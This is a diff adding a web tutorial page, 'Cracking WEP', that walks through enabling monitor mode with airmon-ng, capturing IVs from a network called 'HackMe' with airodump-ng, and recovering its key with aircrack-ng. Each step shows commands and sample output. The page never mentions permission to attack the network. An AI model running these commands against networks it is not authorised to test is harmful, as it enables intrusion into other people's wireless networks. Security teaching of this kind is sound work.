@@ -1,0 +1,69 @@
+<main><section class="utils_articlePage__sM9Xw"><h1>Cracking WEP</h1>
+<p>Make sure you've completed the <a href="/docs/wifi">initial setup</a> before continuing to use the commands on the rest of this page.</p>
+<p>Some commands require root to run. If using Kali, you don't need to worry as you're running as root anyway, if not it might be worth elevating to root on your system.</p>
+<h2>Enable Monitor Mode</h2>
+<p>You need to enable monitor mode on your wireless interface in order for it to send and receive the packets required for the rest of the attack.</p>
+<p>See what devices you have on your system with:</p>
+<pre><code># airmon-ng
+PHY	    Interface	Driver		Chipset
+phy0	wlo1		iwlwifi		Intel Corporation Wireless 7260 (rev 73)</code></pre>
+<p>Our WiFi card has is the <code>wlo1</code> interface. So now we need to enable monitor mode on this interface.</p>
+<pre><code># airmon-ng start wlo1
+PHY	    Interface	Driver		Chipset
+phy0	wlo1		iwlwifi		Intel Corporation Wireless 7260 (rev 73)
+
+            (mac80211 monitor mode vif enabled for [phy0]wlo1 on [phy0]wlo1mon)
+            (mac80211 station mode vif disabled for [phy0]wlo1)</code></pre>
+<p>You might get a warning message saying <code>Found 5 processes that could cause trouble.</code> everything should probably be okay and work fine anyway.</p>
+<p>Now if you list the interfaces again:</p>
+<pre><code># airmon-ng
+PHY  	Interface	Driver		Chipset
+phy0	wlo1mon		iwlwifi		Intel Corporation Wireless 7260 (rev 73)</code></pre>
+<p>Notice how the interface name has changed from <code>wlo1</code> to <code>wlo1mon</code>.
+Now we're ready to start investigating our target WiFi network.</p>
+<h2>Scan Surrounding Networks</h2>
+<p>After we've setup our WiFi interface, we need to scan for our target WiFi network to determine it's ESSID and the channel it's broadcasting on.</p>
+<p>Start the following command and it will start looking for available networks and retrieve information about them. Once you've seen your target network show up you can stop the scanning with <code>Ctrl-c</code>. In this snippet, irrelevant data has been cut out and replaced with <code>[...]</code>. You will likely see quite a few networks here.</p>
+<pre><code># airodump-ng wlo1mon
+    CH  X ][ Elapsed: 0 s ][ 2017-01-01 00:00                                        
+                                                                                                                                                                        
+    BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                        
+    [...]                                                                                 
+    00:18:4D:67:1C:84  -38        5        0    0  11  54 . WEP  WEP         HackMe
+    [...]                                                                                    
+                                                                                                                                                
+    BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+    [...]</code></pre>
+<p>From this, what we're interested in is the <code>BSSID</code>, <code>CH</code>, <code>CIPHER</code> and<code>ESSID</code> columns.</p>
+<p>The <code>BSSID</code> and <code>ESSID</code> values identify our target network, in this guide, we'll be using the <code>ESSID</code> value but we could change the parameters to use the <code>BSSID</code> if we wanted.</p>
+<p>The <code>CH</code> value is the radio channel the target network is broadcasting on. We'll need this later when performing our attack.</p>
+<p>The <code>CIPHER</code> value is the cipher used by the network to protect access and traffic. For this guide the cipher needs to be WEP as we're focusing on attacking WEP networks.</p>
+<h2>Capturing Data</h2>
+<p>Now we know all the data we need to perform our attack on the network. In order for this to work, some data needs to be in transmission over the network, so if no one is connected this won't work. In most cases though someone will be connected and transmitting some kind of data.</p>
+<p>We need to sniff the traffic going across the network and save it to a file so we can then crack the WEP key later using <code>aircrack-ng</code>. You need to capture a reasonable amount of data for this to work. Leave it to capture until the <code>#Data</code> value is above around 64k. You can probably get away with less data, but if the next step doesn't work come back to this step and leave it for a little longer.</p>
+<pre><code># airodump-ng wlo1mon --ivs --channel 11 --essid HackMe -w wep-cracking
+
+    CH 11 ][ Elapsed: 32 s ][ 2017-01-01 00:00                                        
+                                                                                                                                                                        
+    BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                                        
+    00:18:4D:67:1C:84  -41 100      390    99003 2756  11  54 . WEP  WEP         HackMe                                                                     
+                                                                                                                                                                        
+    BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                             
+                                                                                                                                                                        
+    [...]</code></pre>
+<p>This starts dumping data to the file <code>wep-cracking-01.ivs</code>.</p>
+<h2>Cracking the Key</h2>
+<p>We now have all we need to crack the WEP key from our data file.</p>
+<pre><code># aircrack-ng -e HackMe wep-cracking-01.ivs 
+Opening wep-cracking-01.ivs
+Read 99355 packets.
+
+Opening wep-cracking-01.ivs
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 99354 ivs.
+                        KEY FOUND! [ 00:00:00:00:00 ] (ASCII: ..... )
+    Decrypted correctly: 100%</code></pre>
+<p>And there it is, our WEP key! <code>00:00:00:00:00</code> - simple right?</p>
+</section></main>
